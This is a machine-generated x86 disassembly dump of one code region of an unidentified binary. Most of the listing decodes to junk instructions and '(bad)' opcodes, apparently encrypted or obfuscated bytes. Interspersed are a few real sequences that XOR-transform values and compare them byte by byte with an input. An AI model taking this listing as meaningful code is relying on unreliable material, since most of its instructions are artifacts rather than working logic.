  407aad:	inc    DWORD PTR [esi+ebp*4+0x4f308775]
  407ab4:	adc    DWORD PTR [esi],esi
  407ab6:	xor    al,0x77
  407ab8:	nop
  407ab9:	punpckldq mm1,DWORD PTR [esi]
  407abc:	lahf   
  407abd:	fidivr WORD PTR [ebx-0x24bdbc3a]
  407ac3:	jle    0x407a80
  407ac5:	cwde   
  407ac6:	mov    esi,0x34fc3e23
  407acb:	sub    al,0x9c
  407acd:	div    DWORD PTR [esi]
  407acf:	icebp  
  407ad0:	ret    0xe3a3
  407ad3:	inc    ebx
  407ad4:	inc    edx
  407ad5:	outs   dx,BYTE PTR ds:[esi]
  407ad6:	lahf   
  407ad7:	mov    DWORD PTR [esi],0x53b00b0a
  407add:	int3   
  407ade:	push   0x4b8eddb2
  407ae3:	shr    DWORD PTR [eax-0xcdff479],1
  407ae9:	jne    0x407b1e
  407aeb:	inc    eax
  407aec:	out    dx,al
  407aed:	pushf  
  407aee:	cmp    al,0x6f
  407af0:	fsubr  st,st(7)
  407af2:	xchg   edx,eax
  407af3:	jne    0x407afe
  407af5:	xchg   DWORD PTR [ecx],ebp
  407af7:	jge    0x407ac9
  407af9:	int3   
  407afa:	and    DWORD PTR [edx-0x70f72d49],edi
  407b00:	xor    esi,DWORD PTR [edx+0x6e2552f2]
  407b06:	cmp    dl,BYTE PTR [eax+0x33bb54cd]
  407b0c:	(bad)  
  407b0d:	and    al,BYTE PTR [eax-0x4be9c7bd]
  407b13:	mov    WORD PTR [edx-0x7d],fs
  407b16:	mov    ch,0x8b
  407b18:	inc    ebp
  407b19:	or     BYTE PTR [edi],cl
  407b1b:	mov    bh,0x4
  407b1d:	nop
  407b1e:	xor    eax,0x8a40
  407b23:	add    eax,edi
  407b25:	mov    edi,DWORD PTR [ebp-0x14]
  407b28:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407b2c:	mov    eax,DWORD PTR [ebp-0xc]
  407b2f:	inc    edx
  407b30:	cmp    edx,eax
  407b32:	jne    0x407679
  407b38:	pop    edi
  407b39:	pop    ebx
  407b3a:	jmp    0x407cbb
  407b3f:	fistp  QWORD PTR [edi]
  407b41:	aas    
  407b42:	or     bl,bh
  407b44:	or     ch,bl
  407b46:	jmp    0x407b0d
  407b48:	jle    0x407b96
  407b4a:	dec    ebx
  407b4b:	add    al,0xde
  407b4d:	jo     0x407bb5
  407b4f:	jge    0x407b16
  407b51:	jle    0x407bd1
  407b53:	sar    BYTE PTR [edi+0x7e],cl
  407b56:	jle    0x407bab
  407b58:	(bad)  
  407b59:	jmp    0x4b2f:0x4dc147df
  407b60:	dec    edi
  407b61:	loope  0x407bb6
  407b63:	(bad)  
  407b64:	mov    ch,0x79
  407b66:	in     eax,dx
  407b67:	cs cli 
  407b69:	pushf  
  407b6a:	ins    DWORD PTR es:[edi],dx
  407b6b:	mov    ds:0x93599c05,al
  407b70:	add    eax,0xf758a9e2
  407b75:	cmp    al,0x88
  407b77:	arpl   WORD PTR [edi*1-0x362c61d3],ax
  407b7e:	pop    edi
  407b7f:	test   cl,al
  407b81:	mov    ds:0xd8380bc,eax
  407b86:	sbb    ah,0x7
  407b89:	mov    ecx,0x49fcbc29
  407b8e:	lods   al,BYTE PTR ds:[esi]
  407b8f:	xchg   ecx,eax
  407b90:	lock inc esi
  407b92:	mov    al,ds:0x8c15e357
  407b97:	mov    dh,0xca
  407b99:	popa   
  407b9a:	shl    bl,cl
  407b9c:	or     al,BYTE PTR [ecx]
  407b9e:	and    eax,0xfebc9a78
  407ba3:	(bad)  
  407ba4:	in     eax,0xed
  407ba6:	mov    ecx,0xb2cdabd1
  407bab:	es jmp 0x407b30
  407bae:	sub    bh,BYTE PTR [ecx+0x6d742adc]
  407bb4:	dec    esp
  407bb5:	enter  0x374a,0xb0
  407bb9:	xlat   BYTE PTR ds:[ebx]
  407bba:	pop    edi
  407bbb:	fistp  WORD PTR [edx]
  407bbd:	ret    
  407bbe:	pop    ecx
  407bbf:	mov    ecx,0x6679ad05
  407bc4:	mov    al,0x9c
  407bc6:	adc    BYTE PTR [ebp+ebp*8+0x8],bh
  407bca:	inc    edi
  407bcb:	mov    cl,0xf5
  407bcd:	std    
  407bce:	ins    BYTE PTR es:[edi],dx
  407bcf:	lock cmp eax,0x298c41e6
  407bd5:	test   eax,0x34da3a63
  407bda:	push   ds
  407bdb:	scas   al,BYTE PTR es:[edi]
  407bdc:	push   es
  407bdd:	jns    0x407bb9
  407bdf:	fnstsw WORD PTR [ebx+0x353a77fb]
  407be5:	ficomp DWORD PTR [ebx-0x3202a7ec]
  407beb:	xchg   esi,eax
  407bec:	jno    0x407b77
  407bee:	add    al,ch
  407bf0:	in     al,dx
  407bf1:	jp     0x407bca
  407bf3:	mov    esp,0xd9d8db21
  407bf8:	mov    edi,0xcfed047c
  407bfd:	popa   
  407bfe:	sbb    esp,esp
  407c00:	jne    0x407c3b
  407c02:	lea    esi,[eax]
  407c04:	outs   dx,BYTE PTR ds:[esi]
  407c05:	stc    
  407c06:	in     al,dx
  407c07:	xor    BYTE PTR [edi-0x48],0x13
  407c0b:	xchg   edx,eax
  407c0c:	xbegin 0xba8d2291
  407c12:	fadd   st(6),st
  407c14:	dec    sp
  407c16:	mov    ebp,0x3f877a19
  407c1b:	shl    DWORD PTR [esi+edi*1+0x7d],1
  407c1f:	add    ebp,esi
  407c21:	push   ebp
  407c22:	cwde   
  407c23:	push   es
  407c24:	pop    esp
  407c26:	mov    ds:0x8d9fdd08,eax
  407c2b:	xor    eax,0x27d5359a
  407c30:	lahf   
  407c31:	add    edx,ebx
  407c33:	ds cmp edi,eax
  407c36:	sbb    ebx,DWORD PTR [ebx-0x894fcb1]
  407c3c:	test   esi,0xfd1d572d
  407c42:	gs xchg ebx,eax
  407c44:	(bad)  
  407c45:	mov    eax,ds:0x730627e8
  407c4a:	fnstsw WORD PTR [ecx-0x405cbb95]
  407c50:	add    eax,0xe48be357
  407c55:	inc    ebp
  407c56:	inc    ecx
  407c57:	push   ebp
  407c58:	fsub   st(0),st
  407c5a:	lahf   
  407c5b:	ins    BYTE PTR es:[edi],dx
  407c5c:	add    BYTE PTR [edx+edi*2+0x5563c695],0x91
  407c64:	xor    al,0x91
  407c66:	lea    edi,[eax+eiz*1]
  407c69:	jecxz  0x407c78
  407c6b:	aaa    
  407c6c:	div    DWORD PTR [edi+ebp*8]
  407c6f:	xchg   BYTE PTR [ecx+ecx*1+0x4a695df2],al
  407c76:	mov    cl,0x2d
  407c78:	fstp   DWORD PTR [eax+0x7]
  407c7b:	retf   
  407c7c:	jle    0x407cee
  407c7e:	fwait
  407c7f:	inc    esp
  407c80:	in     eax,0x4d
  407c82:	or     cl,BYTE PTR [edi-0x78]
  407c85:	jecxz  0x407c30
  407c87:	in     al,0xf4
  407c89:	lods   al,BYTE PTR ds:[esi]
  407c8a:	pushf  
  407c8b:	or     eax,0x8388f14d
  407c90:	adc    al,0x8a
  407c92:	add    al,0xb
  407c94:	test   al,0xe5
  407c96:	inc    ebx
  407c97:	popf   
  407c98:	push   esp
  407c99:	add    eax,0x24492684
  407c9e:	add    BYTE PTR [edi],bl
  407ca0:	lods   eax,DWORD PTR ds:[esi]
  407ca1:	daa    
  407ca2:	sub    esp,ebx
  407ca4:	cmc    
  407ca5:	mov    dl,0x3e
  407ca7:	vpperm xmm3,xmm1,xmm4,XMMWORD PTR [ecx-0x65]
  407cae:	shl    BYTE PTR [ebx],1
  407cb0:	test   BYTE PTR [esi+0x4f],0xfc
  407cb4:	dec    ebp
  407cb5:	jle    0x407c57
  407cb7:	outs   dx,BYTE PTR ds:[esi]
  407cb8:	cmp    al,0xa1
  407cba:	push   esp
  407cbb:	mov    eax,DWORD PTR [ebp-0x8]
  407cbe:	mov    edx,DWORD PTR [ebp+0x10]
  407cc1:	xor    eax,ecx
  407cc3:	add    eax,esi
  407cc5:	mov    DWORD PTR [edx],eax
  407cc7:	mov    eax,DWORD PTR [ebp-0x8]
  407cca:	xor    eax,ecx
  407ccc:	add    eax,esi
  407cce:	jmp    0x407e4f
  407cd3:	mov    bh,0xb6
  407cd5:	(bad)  
  407cd6:	ror    DWORD PTR [edi+0x86a7bfb],cl
  407cdc:	dec    ebx
  407cdd:	ror    DWORD PTR [edx],cl
  407cdf:	xchg   edi,eax
  407ce0:	aaa    
  407ce1:	inc    esp
  407ce2:	out    0xd1,al
  407ce4:	(bad)  
  407ce5:	jle    0x407d65
  407ce7:	sar    BYTE PTR [edi+0x7e],cl
  407cea:	jle    0x407ca8
  407cec:	sbb    eax,0x56880f0d
  407cf1:	jecxz  0x407cbf
  407cf3:	(bad)  
  407cf4:	icebp  
  407cf5:	imul   ebx,DWORD PTR [esi+0x4b],0xeeb4ae59
  407cfc:	xchg   BYTE PTR [ebp+0x25e3a79c],cl
  407d02:	aad    0x84
  407d04:	outs   dx,BYTE PTR ds:[esi]
  407d05:	inc    edx
  407d06:	test   al,0x2e
  407d08:	pop    edx
  407d09:	jns    0x407c94
  407d0b:	or     ecx,DWORD PTR [ecx+0x4f]
  407d0e:	mov    ds:0x2c55f538,al
  407d13:	xchg   BYTE PTR [ebp-0x49],dh
  407d16:	jle    0x407d8e
  407d18:	mov    ah,BYTE PTR [esi+0x6ebab025]
  407d1e:	das    
  407d1f:	pop    edi
  407d20:	jecxz  0x407d5b
  407d22:	in     al,dx
  407d23:	inc    BYTE PTR [ebx]
  407d25:	jmp    0x9737:0x825c5921
  407d2c:	and    ch,dh
  407d2e:	push   ss
  407d2f:	(bad)  
  407d30:	push   ss
  407d31:	and    eax,0xe150a51
  407d36:	test   dl,al
  407d38:	sbb    BYTE PTR ds:0xa750948e,ch
  407d3e:	xor    eax,0xe2c5b83c
  407d43:	push   ebp
  407d44:	imul   edx
  407d46:	mov    esp,0xf4248737
  407d4b:	and    edx,ebp
  407d4d:	(bad)  
  407d4e:	int    0xd4
  407d50:	and    al,0x7
  407d52:	pusha  
  407d53:	add    DWORD PTR [eax],ebp
  407d55:	mov    DWORD PTR [esi],esp
  407d57:	test   DWORD PTR [eax-0x4638687f],ecx
  407d5d:	inc    edi
  407d5e:	dec    ebx
  407d5f:	push   edx
  407d60:	jb     0x407d12
  407d62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d63:	pop    esp
  407d64:	mov    gs,edx
  407d66:	jne    0x407de6
  407d68:	mov    eax,ds:0x54ba6bb2
  407d6d:	add    bh,BYTE PTR [edi+0x70cdebed]
  407d73:	pop    eax
  407d74:	scas   eax,DWORD PTR es:[edi]
  407d75:	enter  0x20d7,0x1b
  407d79:	je     0x407d73
  407d7b:	jne    0x407dbf
  407d7d:	jns    0x407db9
  407d7f:	(bad)  
  407d80:	add    DWORD PTR [eax],edx
  407d82:	je     0x407d40
  407d84:	(bad)  
  407d85:	cwde   
  407d86:	cmp    BYTE PTR [edx+edi*2],bl
  407d89:	loopne 0x407d34
  407d8b:	sbb    ah,BYTE PTR [ebx+0x78]
  407d8e:	fdivr  QWORD PTR [eax+0x3f]
  407d91:	xor    ebp,DWORD PTR [eax-0x5d7bbd7c]
  407d97:	inc    esi
  407d98:	aam    0x84
  407d9a:	retf   0x24fa
  407d9d:	mov    ds:0xbd971dc9,al
  407da2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407da3:	jg     0x407de9
  407da5:	mov    eax,0xdb2b83ae
  407daa:	mov    BYTE PTR [eax],cl
  407dac:	and    ah,bh
  407dae:	dec    ebx
  407daf:	pop    eax
  407db0:	aam    0x65
  407db2:	or     eax,0xd1eac55f
  407db7:	xchg   esi,eax
  407db8:	jcxz   0x407e03
  407dbb:	loop   0x407e2b
  407dbd:	add    eax,ebp
  407dbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dc0:	hlt    
  407dc1:	sub    edi,esp
  407dc3:	pusha  
  407dc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dc5:	ret    0x6f11
  407dc8:	and    ecx,DWORD PTR [ebx]
  407dca:	mov    gs,esp
  407dcc:	push   eax
  407dcd:	add    eax,0xf2823ad8
  407dd2:	rcr    DWORD PTR [esi],1
  407dd4:	push   es
  407dd5:	lds    edx,FWORD PTR [ecx-0x308cb2dc]
  407ddb:	jnp    0x407e38
  407ddd:	mov    ecx,0x657a1694
  407de2:	les    ebp,FWORD PTR ds:0x60019d86
  407de8:	stos   DWORD PTR es:[edi],eax
  407de9:	in     eax,0xdb
  407deb:	jecxz  0x407d98
  407ded:	(bad)  
  407def:	call   0xce1b:0x8f9a9e00
  407df6:	jge    0x407db3
  407df8:	cmp    al,0x15
  407dfa:	es jbe 0x407ddc
  407dfd:	jns    0x407dfd
  407dff:	fisttp QWORD PTR [esi+0x4fc1ac86]
  407e05:	jo     0x407e1c
  407e07:	repnz ror DWORD PTR [edx-0x5bee84fb],cl
  407e0e:	rcl    DWORD PTR [edi-0x52],cl
  407e11:	bound  esi,QWORD PTR [edi-0x1f2d6154]
  407e17:	pop    ss
  407e18:	lds    ebx,FWORD PTR [edi+eiz*8-0x63]
  407e1c:	xchg   DWORD PTR [ebx],ebx
  407e1e:	inc    ebx
  407e1f:	into   
  407e20:	data16 mov ah,0xb1
  407e23:	mov    ebx,DWORD PTR [ebx+eax*2+0x3b]
  407e27:	xorps  xmm4,XMMWORD PTR [edx-0x4f]
  407e2b:	pop    esp
  407e2c:	pusha  
  407e2d:	mov    WORD PTR [ebp+0x4f],?
  407e30:	push   ebx
  407e31:	sub    ecx,DWORD PTR [ebx-0x3f]
  407e34:	inc    ecx
  407e35:	les    ebp,FWORD PTR [edx+edx*1-0x6a]
  407e39:	in     al,dx
  407e3a:	out    0x58,al
  407e3c:	adc    DWORD PTR [edx],esp
  407e3e:	aad    0xbe
  407e40:	sbb    esp,DWORD PTR [edx-0x46b00d00]
  407e46:	cmp    esp,DWORD PTR [edi+0x10]
  407e49:	push   edx
  407e4a:	pop    es
  407e4b:	push   0x89c09a02
  407e50:	inc    ebp
  407e51:	or     BYTE PTR [ebx+0x448a0845],cl
  407e57:	add    eax,0xff558aa8
  407e5c:	cmp    al,dl
  407e5e:	je     0x4081a3
  407e64:	mov    eax,DWORD PTR [ebp+0x8]
  407e67:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  407e6b:	mov    edx,DWORD PTR [ebp+0xc]
  407e6e:	cmp    al,BYTE PTR [edx]
  407e70:	jne    0x40834a
  407e76:	mov    eax,DWORD PTR [ebp-0x8]
  407e79:	mov    edx,DWORD PTR [ebp+0xc]
  407e7c:	movsx  edx,BYTE PTR [edx]
  407e7f:	xor    eax,ecx
  407e81:	add    eax,esi
  407e83:	cmp    edx,eax
  407e85:	je     0x40833e
  407e8b:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  407e92:	lea    eax,[ebp-0x18]
  407e95:	jmp    0x408016
  407e9a:	xchg   BYTE PTR [eax],cl
  407e9c:	mov    al,ds:0xb8a6a08e
  407ea1:	or     BYTE PTR [edx],ah
  407ea3:	mov    bl,cl
  407ea5:	mov    dl,0xd8
  407ea7:	out    dx,eax
  407ea8:	mov    ds:0x7ed8b501,eax
  407ead:	jle    0x407e81
  407eaf:	jg     0x407f2f
  407eb1:	jle    0x407e9d
  407eb3:	xchg   esi,eax
  407eb4:	jecxz  0x407f17
  407eb6:	pop    ebx
  407eb7:	icebp  
  407eb8:	jmp    0x4ac942d5
  407ebd:	mov    esp,0x38721e
  407ec2:	xchg   BYTE PTR [edx],ch
  407ec4:	lock ins BYTE PTR es:[edi],dx
  407ec6:	pushf  
  407ec7:	ds cmp cl,al
  407eca:	mov    ebx,0xfeb74282
  407ecf:	xor    ebp,DWORD PTR [esi-0x4e]
  407ed2:	ins    BYTE PTR es:[edi],dx
  407ed3:	ret    
  407ed4:	mov    al,ds:0x3bbd4032
  407ed9:	retf   
  407eda:	xor    eax,0xfab41f98
  407edf:	adc    ebp,ebp
  407ee1:	push   ecx
  407ee2:	out    0x42,al
  407ee4:	sub    ebx,esi
  407ee6:	repz inc si
  407ee9:	sub    al,0xf0
  407eeb:	mov    ch,0xe1
  407eed:	scas   al,BYTE PTR es:[edi]
  407eee:	bound  edx,QWORD PTR [eax-0xdac36de]
  407ef4:	pop    ecx
  407ef5:	mov    ss,WORD PTR [ebp-0x3b]
  407ef8:	sbb    eax,0x4e4f4ff0
  407efd:	mov    ch,0x32
  407eff:	mov    ch,0xd
  407f01:	hlt    
  407f02:	xchg   ebx,eax
  407f03:	push   0xa1a0de43
  407f08:	and    al,0x9e
  407f0a:	arpl   di,ax
  407f0c:	sbb    BYTE PTR [edi+ebx*4-0x3d],ch
  407f10:	les    ebx,FWORD PTR [ebp+0x6d]
  407f13:	ja     0x407eb1
  407f15:	inc    ebx
  407f16:	ret    0x4aa9
  407f19:	pushf  
  407f1a:	retf   
  407f1b:	fild   WORD PTR [ecx]
  407f1d:	dec    edi
  407f1e:	es mov esi,0x1ec78c22
  407f24:	mov    BYTE PTR [esi+0x48],dl
  407f27:	pop    edx
  407f28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f29:	jnp    0x407ec1
  407f2b:	pusha  
  407f2c:	and    eax,0x73c4cb2b
  407f31:	xor    BYTE PTR [ebx],dh
  407f33:	dec    edx
  407f34:	(bad)  
  407f35:	adc    esp,ecx
  407f37:	dec    eax
  407f38:	adc    ecx,DWORD PTR [ebx+edi*4]
  407f3b:	jp     0x407f96
  407f3d:	jge    0x407f4c
  407f3f:	aad    0x2c
  407f41:	test   al,0x5e
  407f43:	mov    dh,BYTE PTR [esi-0x1b94449a]
  407f49:	cmp    dh,BYTE PTR [edi+0x40]
  407f4c:	iret   
  407f4d:	retf   
  407f4e:	inc    esp
  407f4f:	mov    eax,ds:0xefdfe8e4
  407f54:	cmc    
  407f55:	jns    0x407f04
  407f57:	and    eax,0xb1538990
  407f5c:	lock jno 0x407faf
  407f5f:	add    ecx,edi
  407f61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f62:	cmp    bh,BYTE PTR [ebp+0x3d1aa8fc]
  407f68:	mov    ah,0x9c
  407f6a:	popa   
  407f6b:	(bad)  [ebx]
  407f6d:	add    DWORD PTR [ebx-0x57f36135],ebp
  407f73:	mov    eax,ds:0x5d79231a
  407f78:	adc    ebp,DWORD PTR [ebp+0x6c]
  407f7b:	pop    ebp
  407f7c:	hlt    
  407f7d:	cwde   
  407f7e:	stc    
  407f7f:	aaa    
  407f80:	xchg   esp,eax
  407f81:	test   eax,0x62a11942
  407f86:	leave  
  407f87:	fstp   DWORD PTR [edi-0x450886e]
  407f8d:	loopne 0x408005
  407f8f:	in     al,dx
  407f90:	jl     0x407ff6
  407f92:	xchg   ecx,eax
  407f93:	mov    WORD PTR [bp+di],gs
  407f96:	xchg   esp,eax
  407f97:	cli    
  407f98:	repz retf 0xa2f6
  407f9c:	inc    esi
  407f9d:	mov    al,ds:0x4d60f62
  407fa2:	mov    cl,0x2d
  407fa4:	jne    0x407f27
  407fa6:	add    ch,BYTE PTR [ebx+0x8]
  407fa9:	cmc    
  407faa:	scas   al,BYTE PTR es:[edi]
  407fab:	int    0x81
  407fad:	sti    
  407fae:	mov    edi,0xa3bd9217
  407fb3:	bound  eax,QWORD PTR [eax-0x31]
  407fb6:	cmp    esi,DWORD PTR [ecx-0x523e5fa2]
  407fbc:	fbld   TBYTE PTR [ebp-0xb]
  407fbf:	mov    esi,0xe9e8a685
  407fc4:	push   ds
  407fc5:	sub    al,0xc6
  407fc7:	fwait
  407fc8:	inc    ebx
  407fc9:	add    esi,esi
  407fcb:	popf   
  407fcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fcd:	pusha  
  407fce:	mov    edx,DWORD PTR [esi+0x28]
  407fd1:	mov    cs,WORD PTR [esi+ebp*1+0x32]
  407fd5:	gs inc ebp
  407fd7:	cmp    al,0xd9
  407fd9:	mov    dl,0xe4
  407fdb:	ja     0x408038
  407fdd:	and    al,ch
  407fdf:	(bad)  
  407fe1:	sti    
  407fe2:	retf   0xfa25
  407fe5:	in     eax,0xfe
  407fe7:	xor    BYTE PTR [eax],al
  407fe9:	xchg   ebp,eax
  407fea:	popf   
  407feb:	cmp    eax,0xe5f1a765
  407ff0:	adc    ch,bh
  407ff2:	or     eax,0x1fc4daa4
  407ff7:	add    edi,ebx
  407ff9:	rcl    DWORD PTR [esi+edx*1],1
  407ffc:	in     al,dx
  407ffd:	dec    edx
  407ffe:	add    ebp,DWORD PTR [ebp+0x64fdf000]
  408004:	xlat   BYTE PTR ds:[ebx]
  408005:	out    dx,eax
  408006:	xchg   ebx,eax
  408007:	push   ecx
  408008:	adc    al,0xc3
  40800a:	dec    edx
  40800b:	sar    DWORD PTR [edi-0x72],1
  40800e:	dec    ecx
  40800f:	dec    esp
  408010:	jge    0x408015
  408012:	imul   edx,DWORD PTR [eax+0x46],0xffffff89
  408016:	mov    DWORD PTR [ebp-0x14],eax
  408019:	mov    eax,DWORD PTR [ebp-0x14]
  40801c:	add    DWORD PTR [eax],0x705fa8f
  408022:	jmp    0x4081a3
  408027:	test   al,0x70
  408029:	cmp    ch,BYTE PTR [ecx-0x46]
  40802c:	jge    0x4080ab
  40802e:	xor    DWORD PTR [edx-0x4f],eax
  408031:	imul   esi,DWORD PTR [edx+0x6aae214b],0x7e7eda29
  40803b:	sar    BYTE PTR [edi+0x7e],cl
  40803e:	jle    0x408010
  408040:	sar    bl,1
  408042:	cmp    edi,DWORD PTR [eax]
  408044:	cwd    
  408046:	pop    edi
  408047:	hlt    
  408048:	imul   DWORD PTR [eax+0x194aae1f]
  40804e:	rcr    BYTE PTR [ebx],cl
  408050:	js     0x4080ce
  408052:	mov    bh,al
  408054:	popf   
  408055:	les    esp,FWORD PTR [eax+0x22b8495c]
  40805b:	outs   dx,BYTE PTR ds:[esi]
  40805c:	in     eax,0x51
  40805e:	das    
  40805f:	stos   DWORD PTR es:[edi],eax
  408060:	mov    ebp,0xff2f8b93
  408065:	xchg   DWORD PTR [ecx],ebx
  408067:	dec    esp
  408068:	out    0xf9,al
  40806a:	je     0x4080af
  40806c:	jecxz  0x40808e
  40806e:	sub    al,0x82
  408070:	addr16 push 0x9da25a28
  408076:	in     eax,0xed
  408078:	shl    DWORD PTR [ecx],1
  40807a:	loope  0x408092
  40807c:	nop
  40807d:	sub    BYTE PTR [edi],ch
  40807f:	xor    BYTE PTR [ecx+0x514e1f2b],0xe8
  408086:	and    dl,BYTE PTR [edx]
  408088:	mov    bl,0x2b
  40808a:	xchg   ebp,eax
  40808b:	push   ds
  40808c:	jns    0x40806b
  40808e:	jo     0x408019
  408090:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408091:	pop    ebp
  408092:	mov    ebp,0x81eda99f
  408097:	xor    ecx,DWORD PTR [eax+0x47]
  40809a:	out    dx,al
  40809b:	ins    BYTE PTR es:[edi],dx
  40809c:	push   esi
  40809d:	add    DWORD PTR [ebp+0x59],esp
  4080a0:	xchg   bl,ch
  4080a2:	mov    BYTE PTR [ecx],ch
  4080a4:	and    BYTE PTR ds:0x622bddf8,dl
  4080aa:	or     al,0xde
  4080ac:	in     al,0xcf
  4080ae:	rol    BYTE PTR [ecx],1
  4080b0:	adc    ah,dh
  4080b2:	repz mov ch,0xe1
  4080b5:	jl     0x408116
  4080b7:	jl     0x408098
  4080b9:	out    0x42,al
  4080bb:	call   0x4a06:0x3fb4556
  4080c2:	(bad)  
  4080c3:	sub    eax,0x69d2fa1d
  4080c8:	mov    al,0x10
  4080ca:	cli    
  4080cb:	cdq    
  4080cc:	ja     0x408059
  4080ce:	pusha  
  4080cf:	ss mov bl,0xa6
  4080d2:	ss inc ebx
  4080d4:	cli    
  4080d5:	mov    al,0x4f
  4080d7:	fwait
  4080d8:	mov    ch,0xee
  4080da:	adc    eax,0xfa4b6b9e
  4080df:	test   al,0x26
  4080e1:	mov    bl,0x15
  4080e3:	cmp    esi,DWORD PTR [eax]
  4080e5:	dec    ebp
  4080e6:	scas   al,BYTE PTR es:[edi]
  4080e7:	or     BYTE PTR [edx-0xd],al
  4080ea:	imul   edx,edx,0x7c
  4080ed:	mov    ebp,0xafa7d0dd
  4080f2:	int    0xfe
  4080f4:	dec    ebp
  4080f5:	sbb    BYTE PTR [eax+ebp*8-0x10fb43f0],dh
  4080fc:	leave  
  4080fd:	cmp    esi,DWORD PTR [ecx+edx*2-0x6d6198b8]
  408104:	jno    0x408136
  408106:	push   edx
  408107:	or     eax,0x8f9853d3
  40810c:	jl     0x4080ec
  40810e:	dec    edx
  40810f:	mov    ebx,0xcaaeca38
  408114:	mov    DWORD PTR [edi+eax*2-0x13],ecx
  408118:	push   es
  408119:	leave  
  40811a:	cmp    DWORD PTR ds:0x807ebe06,0x72
  408121:	push   ds
  408122:	aaa    
  408123:	call   0x711a7dc8
  408128:	mov    dl,BYTE PTR [ebx]
  40812a:	cmp    BYTE PTR [esi],al
  40812c:	and    al,0xc7
  40812e:	fs add eax,0x9f6c8388
  408134:	cmp    BYTE PTR [esi+0x1c],bh
  408137:	push   esi
  408138:	pop    ecx
  408139:	int3   
  40813a:	dec    BYTE PTR [edi]
  40813c:	xchg   esp,eax
  40813d:	mov    esi,0xaffa7832
  408142:	dec    esi
  408143:	test   DWORD PTR [ecx+eax*2-0x606caa11],esp
  40814a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40814b:	std    
  40814c:	and    bl,0x8d
  40814f:	aad    0x5c
  408151:	loopne 0x408181
  408153:	or     DWORD PTR [edi+0x793ba066],esi
  408159:	dec    eax
  40815a:	sbb    BYTE PTR [ebp+0x65],bl
  40815d:	xchg   esi,eax
  40815e:	lds    edx,FWORD PTR [eax-0x37]
  408161:	push   es
  408162:	scas   al,BYTE PTR es:[edi]
  408163:	cwde   
  408164:	and    BYTE PTR [ebx-0x4d],ah
  408167:	jg     0x4081c2
  408169:	dec    ebx
  40816a:	xchg   edi,eax
  40816b:	sar    eax,1
  40816d:	xor    eax,0xdb71a99e
  408172:	rcr    BYTE PTR [edi],1
  408174:	xchg   ebp,edx
  408176:	aam    0x7f
  408178:	push   ss
  408179:	xchg   edx,eax
  40817a:	shl    DWORD PTR [ecx-0x1dcad3f4],0x7
  408181:	pop    eax
  408182:	ror    BYTE PTR ds:0x242051c,cl
  408188:	stc    
  408189:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40818a:	cmp    cl,BYTE PTR ds:0x99ae2b10
  408190:	daa    
  408191:	jp     0x408204
  408193:	dec    edx
  408194:	xor    eax,0xa756ec77
  408199:	jns    0x408207
  40819b:	in     al,dx
  40819c:	and    BYTE PTR [ebp-0x46],ch
  40819f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081a0:	int    0x7
  4081a2:	mov    al,0x8b
  4081a4:	inc    ebp
  4081a5:	lock mov edx,DWORD PTR [ebp+0x8]
  4081a9:	xor    eax,ecx
  4081ab:	jmp    0x40832c
  4081b0:	dec    edx
  4081b1:	sbb    ch,0x7
  4081b4:	fstp   QWORD PTR [ebx+0x4c]
  4081b7:	inc    ebp
  4081b8:	inc    eax
  4081b9:	jmp    DWORD PTR [ebp-0x30455b71]
  4081bf:	dec    ebx
  4081c0:	(bad)  
  4081c1:	fstp   TBYTE PTR [esi+0x7e]
  4081c4:	sar    BYTE PTR [edi+0x7e],cl
  4081c7:	jle    0x408195
  4081c9:	data16 (bad) 
  4081cb:	jl     0x40821b
  4081cd:	test   BYTE PTR [ebp+0x14],bh
  4081d0:	pop    ds
  4081d1:	mov    ah,0x3b
  4081d3:	cdq    
  4081d4:	jbe    0x408236
  4081d6:	xchg   ebp,eax
  4081d7:	retf   0x2b42
  4081da:	in     eax,dx
  4081db:	mul    DWORD PTR [ecx]
  4081dd:	push   cs
  4081de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081df:	mov    es,ebp
  4081e1:	and    al,0x7
  4081e3:	addr16 push edx
  4081e5:	(bad)  
  4081e6:	loopne 0x408244
  4081e8:	(bad)  
  4081ea:	pop    DWORD PTR [eax-0xfac3189]
  4081f0:	aam    0x88
  4081f2:	adc    BYTE PTR [edx],bl
  4081f4:	cwde   
  4081f5:	test   eax,0x44d6a602
  4081fa:	cmp    al,0x12
  4081fc:	jge    0x4081ea
  4081fe:	aam    0x6f
  408200:	cmp    esi,DWORD PTR [eax]
  408202:	mov    ah,0x90
  408204:	adc    edx,DWORD PTR [esi]
  408206:	js     0x408204
  408208:	mov    esi,0x628a552d
  40820d:	ret    
  40820e:	add    dh,BYTE PTR [eax-0x70]
  408211:	out    dx,al
  408212:	push   ebx
  408213:	arpl   WORD PTR [edx-0x41fbf484],sp
  408219:	cwde   
  40821a:	push   edi
  40821b:	xlat   BYTE PTR ds:[ebx]
  40821c:	jns    0x408221
  40821e:	and    eax,0xba046a14
  408223:	(bad)  
  408225:	sbb    eax,0x9eea0bc
  40822a:	je     0x4082aa
  40822c:	out    dx,al
  40822d:	sub    bh,cl
  40822f:	lock and edx,DWORD PTR [edx+eax*1+0x1b]
  408234:	call   DWORD PTR [eax+ebp*2]
  408237:	xchg   ebp,eax
  408238:	std    
  408239:	ret    
  40823a:	(bad)  
  40823b:	call   0x275ac1a5
  408240:	outs   dx,BYTE PTR ds:[esi]
  408241:	push   ebp
  408242:	ins    BYTE PTR es:[edi],dx
  408243:	call   0x80da88f1
  408248:	and    al,BYTE PTR [ebp+0x56dccafe]
  40824e:	xor    ebp,esi
  408250:	dec    eax
  408251:	mov    ebx,0x117229a3
  408256:	jecxz  0x4082b3
  408258:	dec    eax
  408259:	mov    ch,0xb
  40825b:	jecxz  0x40823d
  40825d:	sbb    edx,esp
  40825f:	outs   dx,DWORD PTR ds:[esi]
